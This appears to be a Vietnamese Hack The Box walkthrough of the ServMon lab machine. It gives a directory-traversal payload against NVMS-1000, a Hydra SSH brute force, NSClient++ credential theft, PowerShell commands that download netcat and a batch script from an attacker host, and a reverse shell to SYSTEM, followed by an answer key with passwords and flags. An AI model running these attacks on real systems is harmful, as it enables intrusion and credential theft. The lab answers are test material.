![image](https://hackmd.io/_uploads/SymrruCFC.png)

# Machine info and Comment
## Machine info
ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user&amp;amp;#039;s desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it&amp;amp;#039;s possible enumerate the system and find the password for `NSClient++` (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of `NT AUTHORITY\SYSTEM`. Users have been given permissions to restart the `NSCP` service, and after creating a malicious script, the service is restarted and command execution is achieved as SYSTEM.

## Comment


# Recon
## nmap 
Sau khi nmap ta thấy nó scan được **9** port ftp, ssh, http, smb, https
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 11:43 EDT
Nmap scan report for 10.10.10.184
Host is up (0.28s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  nrpe
6699/tcp open  napster
8443/tcp open  https-alt

Nmap done: 1 IP address (1 host up) scanned in 5.58 seconds
```
Từ đây, ta sẽ scan tiếp các port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sCV -p21,22,80,135,139,445,5666,6699,8443 10.10.10.184
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 11:49 EDT
Nmap scan report for 10.10.10.184
Host is up (0.27s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     %~4z
|     workers
|_    jobs
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=8/6%Time=66B2461F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/
SF:html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r
SF:\n\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20t
SF:ext/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:
SF:\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x2
SF:0XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1
SF:/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3
SF:\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x2
SF:0\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\
SF:x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n
SF:")%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/h
SF:tml\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\
SF:r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTM
SF:L\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/
SF:xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org
SF:/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20
SF:\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x
SF:20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(
SF:RTSPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r
SF:\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r
SF:\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x20
SF:1\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml
SF:1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999
SF:/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\
SF:x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x2
SF:0\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.94SVN%T=SSL%I=7%D=8/6%Time=66B24628%P=x86_64-pc-linux-
SF:gnu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocati
SF:on:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0%\0\0\0\0\n}4z\x02\0\0\x
SF:80%~4z\x02\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xd86\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2
SF:018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1
SF:\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RT
SF:SPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument
SF:\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:
SF:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-08-06T14:51:54
|_  start_date: N/A
|_clock-skew: -59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.00 seconds
```

## Port 21 - fpt
Từ output nhận được từ nmap ta thấy được port 21 là **ftp** và login vào mà **không cần** credential 
```
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
```
Login vào với user: `anonymous`
```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.184 21
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49686|)
c125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49687|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
```
Khi kết nối ftp ta thu thập được các thông tin:
### User Nadine
```
ftp> cd Nadine
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49689|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt

┌──(kali㉿kali)-[~]
└─$ cat Confidential.txt   
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine 
```
Nadine đã để file **Passwords.txt** có thể chứa password của 1 hoặc cả 2 vào Desktop của Nathan

### User Nathan
```
ftp> cd Nathan
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49690|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> get Notes\ to\ do.txt

┌──(kali㉿kali)-[~]
└─$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint 
```
Nathan đã tạo file `Notes to do.txt` để note lại 1 số công việc đang và đã làm 

## Port 80 - http
Truy cập vào trang web nó mặc định sẽ kết nối đến `http://10.10.10.184/Pages/login.htm` với tiêu đề **NVMS-1000**

![image](https://hackmd.io/_uploads/ry2oja19R.png)

Trang login không hoạt động với một số hoạt động khai thác và tìm các path ẩn với gobuster hoặc `robots.txt` cũng tương tự

### Metasploit
Dùng Metasploit kiểm tra có hoạt động khai thác nào không
```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q 
msf6 > search nvms-1000

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/tvt_nvms_traversal 
```
Kết quả trả về duy nhất 1 lỗ hổng `Directory Traversal` từ **CVE-2019-20085**

![image](https://hackmd.io/_uploads/BkHxapyqA.png)

## Port 445 - SMB
```
┌──(kali㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.184
session setup failed: NT_STATUS_ACCESS_DENIED
```
Nó từ chối đăng ta đăng nhập vào nên tạm thời bro qua

## Port 8443 - https
Truy cập vào trang web nó mặc định sẽ kết nối đến `https://10.10.10.184:8443/index.html`

![image](https://hackmd.io/_uploads/H1cJ1Rk50.png)

Ngoài hiển thị form login ra thì các tính năng khác không thể truy cập được. Ta sẽ xem lỗ hổng có thể có ở searchsploit

```
┌──(kali㉿kali)-[~]
└─$ searchsploit nsclient   
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                  | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                                 | windows/local/46802.txt
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

# User flag
## Exploit
### Burp suite
Từ việc ghi chú về vị trí của Password và lỗ hổng có thể khai thác được từ port 80 ta có payload gửi đi 
```
/../../../../../../c:/users/nathan/desktop/passwords.txt
```
![image](https://hackmd.io/_uploads/r1drDygqC.png)

Có lẽ vị trí của nó đã nằm sẵn ở ổ `C:` nên sửa lại payload ta mới nhận được file password

![image](https://hackmd.io/_uploads/B13i9ye9R.png)

### Hydra 
Vì SSH đang chạy với Windows nên ta sẽ brute-force tài khoản và mật khẩu bằng Hydra

Tạo file `user.txt` thêm administrator nếu may mắn có và file `password.txt` lấy được từ trên
```
┌──(kali㉿kali)-[~]
└─$ hydra -L usr.txt -P pass.txt 10.10.10.184 ssh                               
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-06 14:33:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:3/p:7), ~2 tries per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-06 14:33:21
```

Ta lấy được password của `Nadine` là **L1k3B1gBut7s@W0rk**

## Post-Exploit
Sau khi login ssh ta nhận được tài khoản `Nadine` với quyền `user` 
```
┌──(kali㉿kali)-[~]
└─$ ssh nadine@10.10.10.184             
The authenticity of host '10.10.10.184 (10.10.10.184)' can't be established.
ED25519 key fingerprint is SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.184' (ED25519) to the list of known hosts.
nadine@10.10.10.184's password: 



Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```
Truy cập vào `C:\Users\nadine\Desktop` để lấy flag
```
nadine@SERVMON C:\Users\Nadine>cd Desktop                           
                                                           
nadine@SERVMON C:\Users\Nadine\Desktop>dir                 
 Volume in drive C has no label.                   
 Volume Serial Number is 20C1-47A1                 
                                                   
 Directory of C:\Users\Nadine\Desktop              
                                                   
02/28/2022  08:05 PM    <DIR>          .           
02/28/2022  08:05 PM    <DIR>          ..          
08/05/2024  06:35 PM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   6,060,613,632 bytes free 
                                                   
nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt 
5ca799cdd73261e15*****
```
# Root flag
## Exploit
Vì đã khai thác để lấy được tài khoản user rồi nên ta sẽ sử dụng option 2 từ việc recon được lỗ hổng **NSClient**

Trong phần khai thác ở [CVE](https://www.exploit-db.com/exploits/46802) này ta có thể lấy được password của admin khi đã có quyền truy cập vào nội bộ tại `c:\program files\nsclient++\nsclient.ini`

![image](https://hackmd.io/_uploads/SJ2IBexq0.png)

![image](https://hackmd.io/_uploads/SJDCrlec0.png)

Login vào `https://10.10.10.184:8443/index.html#/` với password là **ew2x6SsGTxjRwXOT**

![image](https://hackmd.io/_uploads/ryArUge9R.png)

Check version của NSCLient++ là **0.5.2.35**
```
PS C:\Program Files\NSClient++> .\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```
### SSH Tunnel
Vì Nathan đã note trong `Notes to do.txt` là khóa quyền truy cập nên ta sẽ nhận lỗi 404 

![image](https://hackmd.io/_uploads/BkqxKlxcR.png)

Do đó ta sẽ được phép truy cập từ `localhost`

```
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

Với lệnh tra ta có thể truy cập vào local: `https://127.0.0.1:8443`

![image](https://hackmd.io/_uploads/SJ_0Yeg5C.png)

### Download nc.exe and exploit.bat
Ta sẽ download `nc.exe` `exploit.bat`
```
PS C:\ProgramData> iwr http://10.10.14.93:8888/nc64.exe -Outfile C:\ProgramData\nc.exe
PS C:\ProgramData> iwr http://10.10.14.93:8888/exploit.bat -Outfile C:\ProgramData\exploit.bat

PS C:\ProgramData> dir

    Directory: C:\ProgramData

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/28/2022   5:44 PM                VMware
-a----         8/6/2024  12:19 PM             56 exploit.bat
-a----         8/6/2024  12:25 PM          45272 nc.exe

```

Và ta đã up thành công. Tiếp theo, sẽ thêm một phần mới vào cài đặt 

### Setting Script and Scheduler
![image](https://hackmd.io/_uploads/HyMa5Zl90.png)

"Add" và "Save config". Làm tương tự với Scheduler

![image](https://hackmd.io/_uploads/rJrxoZg90.png)

Sau khi lưu tất cả các thay đổi ta sẽ "Reload".

![image](https://hackmd.io/_uploads/HkOwobe9R.png)

Đợi một lúc và ta sẽ nghe được kết nối
```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -nlvp 4433             
listening on [any] 4433 ...
connect to [10.10.14.93] from (UNKNOWN) [10.10.10.184] 52108
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```
## Post-Exploit
```
C:\Program Files\NSClient++>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt    
type root.txt
004fe7a4c0e8d9e4363e0*****
```

# Results
1. What service runs on port 21? --> FTP
2. Is anonymous authentication enabled on the FTP service? (The answer is either "Yes" or "No") --> yes
3. What is the full name of the sensitive file present on Nathans's Desktop? --> Passwords.txt
4. What is the name of the surveillance application on TCP port 80? --> NVMS-1000
5. What 2019 CVE ID describes a vulnerability in NVMS-1000? --> CVE-2019-20085
6. What is the valid password to authenticate over SSH on TCP port 22? --> L1k3B1gBut7s@W0rk 
7. Submit the flag located on the nadine user's desktop. --> 5ca799cdd73261e1530fe84*******
8. There's an unusual third part application on the system. What's the name of a very this software? --> NSClient++
9. What's the password for accessing NSClient++? --> ew2x6SsGTxjRwXOT
10. What version of NSCLient++ is installed? --> 0.5.2.35
11. We have found a non-default application, we know the version installed and we can access it as an authenticated user. Searching for vulnerabilities affecting this environment reveals a Local Privilege Escalation vulnerability. As what user we get code execution after successfully exploiting this vulnerability? --> nt authority\system
12. Submit the flag located on the administrator's desktop. --> 004fe7a4c0e8d9e4363e0******

![image](https://hackmd.io/_uploads/ryKUnZecR.png)
